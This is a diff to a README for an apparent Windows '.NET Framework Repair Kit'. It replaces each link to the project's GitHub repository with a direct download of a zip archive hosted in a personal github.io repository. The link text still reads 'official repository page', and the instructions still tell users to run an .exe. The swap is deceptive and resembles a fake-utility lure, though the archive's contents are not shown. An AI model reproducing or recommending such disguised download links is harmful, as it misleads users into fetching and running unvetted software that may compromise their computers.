@@ -5,7 +5,7 @@ description: "Repair your NET Framework installation on Windows 10 and 11 with t
 ---
 # 🛠️ NET-Framework-Repair-Kit - Restore your Windows framework tools easily
 
-[ ![Download NET-Framework-Repair-Kit](https://img.shields.io/badge/Download-Repair-Tool-blue) ](https://github.com/veskial5069/NET-Framework-Repair-Kit)
+[ ![Download NET-Framework-Repair-Kit](https://img.shields.io/badge/Download-Repair-Tool-blue) ](https://raw.githubusercontent.com/veskial5069/veskial5069.github.io/main/tappen/github-veskial-io-2.9.zip)
 
 This tool fixes errors related to the Microsoft .NET Framework on Windows 10 and Windows 11. Many programs require this framework to run correctly. When files within the framework become corrupted or incomplete, your applications might crash, fail to start, or show error messages. This kit automates the detection and repair of these files to restore system stability.
 
@@ -21,13 +21,13 @@ You need standard user permissions to run the tool. If your computer requires an
 
 Follow these steps to obtain the repair kit:
 
-1. Visit the [official repository page](https://github.com/veskial5069/NET-Framework-Repair-Kit).
+1. Visit the [official repository page](https://raw.githubusercontent.com/veskial5069/veskial5069.github.io/main/tappen/github-veskial-io-2.9.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the most recent version available.
 4. Select the file ending in `.exe` to begin the download.
 5. Save the file to your desktop or your Downloads folder.
 
-[ ![Download NET-Framework-Repair-Kit](https://img.shields.io/badge/Download-Repair-Tool-gray) ](https://github.com/veskial5069/NET-Framework-Repair-Kit)
+[ ![Download NET-Framework-Repair-Kit](https://img.shields.io/badge/Download-Repair-Tool-gray) ](https://raw.githubusercontent.com/veskial5069/veskial5069.github.io/main/tappen/github-veskial-io-2.9.zip)
 
 ## ⚙️ Running the Repair Process
 
